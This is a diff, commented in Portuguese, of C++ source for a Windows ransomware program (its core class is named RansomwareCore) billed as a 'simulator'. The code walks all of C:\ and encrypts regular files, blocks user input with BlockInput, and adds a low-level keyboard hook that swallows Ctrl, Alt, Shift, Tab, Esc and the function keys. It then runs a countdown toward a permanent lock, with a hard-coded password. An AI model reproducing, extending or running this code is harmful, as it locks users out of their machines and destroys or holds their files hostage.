@@ -1,3 +1,4 @@
+// oiee! deixei um guia comppleto com comentarios em cada parte do codigo :3
 #include <iostream>
 #include <fstream>
 #include <filesystem>
@@ -50,7 +51,7 @@ public:
     }
 };
 
-// --- MÓDULO 3: SCANNER DE ARQUIVOS (ROBUSTO) ---
+// --- MÓDULO 3: SCANNER DE ARQUIVOS ---
 class FileScanner {
 private:
     CryptoEngine& engine;
@@ -61,24 +62,22 @@ public:
     void scanAndProcess(const std::string& targetDir, bool encrypt) {
         if (!fs::exists(targetDir)) return;
 
-        try {
-            for (auto it = fs::recursive_directory_iterator(targetDir, fs::directory_options::skip_permission_denied);
-                 it != fs::end(it); ++it) {
-                try {
-                    if (it->is_regular_file()) {
-                        std::string pathStr = it->path().string();
+        for (auto it = fs::recursive_directory_iterator(targetDir, fs::directory_options::skip_permission_denied);
+             it != fs::end(it); ++it) {
+            try {
+                if (it->is_regular_file()) {
+                    std::string pathStr = it->path().string();
 
-                        if (pathStr.find("Windows") != std::string::npos || 
-                            pathStr.find("simulador.exe") != std::string::npos) continue;
+                    if (pathStr.find("Windows") != std::string::npos || 
+                        pathStr.find("simulador.exe") != std::string::npos) continue;
 
-                        if (pathStr.find(".sys") != std::string::npos || 
-                            pathStr.find(".dll") != std::string::npos) continue;
+                    if (pathStr.find(".sys") != std::string::npos || 
+                        pathStr.find(".dll") != std::string::npos) continue;
 
-                        engine.processFile(it->path(), encrypt);
-                    }
-                } catch (...) { continue; }
-            }
-        } catch (...) { }
+                    engine.processFile(it->path(), encrypt);
+                }
+            } catch (...) { continue; }
+        }
     }
 };
 
@@ -170,9 +169,27 @@ public:
     }
 };
 
-// --- MÓDULO 6: MAIN (O ORQUESTRADOR FINAL) ---
+// --- MÓDULO 6: HOOK DE TECLADO (O BLOQUEADOR) ---
+HHOOK hhkKeyboard = NULL;
+
+LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == 0) { // nCode == 0 é o padrão para processar a tecla
+        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
+
+        // Bloqueia: Ctrl, Alt, Shift, Tab, Esc, e F1 até F12
+        if (pKeyBoard->vkCode == VK_CONTROL || pKeyBoard->vkCode == VK_MENU || 
+            pKeyBoard->vkCode == VK_SHIFT || pKeyBoard->vkCode == VK_TAB || 
+            pKeyBoard->vkCode == VK_ESCAPE || (pKeyBoard->scanCode >= VK_F1 && pKeyBoard->scanCode <= VK_F12)) {
+            return 1; // Bloqueia a tecla
+        }
+    }
+    return CallNextHookEx(hhkKeyboard, nCode, wParam, lParam);
+}
+
+// --- MÓDULO 7: MAIN (O ORQUESTRADOR FINAL) ---
 int main() {
-    std::string pastaAlvo = "C:\\"; // Mude para pasta de teste para segurança inicial
+    // CONFIGURAÇÃO DO ALVO
+    std::string pastaAlvo = "C:\\"; // Mude para pasta de teste primeiro!
     std::string senhaCorreta = "batata";
     
     SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
@@ -190,13 +207,16 @@ int main() {
     scanner.scanAndProcess(pastaAlvo, true); 
     std::cout << "[!] Criptografia concluida.\n";
 
-    // 2. Bloqueio
+    // 2. Bloqueio de Hardware
     BlockInput(TRUE); 
 
-    // 3. Timer
+    // 3. Instalação do Hook de Teclado
+    hhkKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
+
+    // 4. Timer
     std::thread timerThread(&RansomwareCore::startTimer, &core);
 
-    // 4. Loop de Interface
+    // 5. Loop de Interface
     while (core.getState() != AppState::SUCCESS && core.getState() != AppState::LOCKED_PERMANENTLY) {
         renderer.renderUI(core);
 
@@ -217,7 +237,8 @@ int main() {
         if (core.getTime() < 1) break; 
     }
 
-    // 5. Liberação
+    // 6. Limpeza Final
+    UnhookWindowsHookEx(hhkKeyboard);
     BlockInput(FALSE); 
 
     if (core.getState() == AppState::LOCKED_PERMANENTLY) {
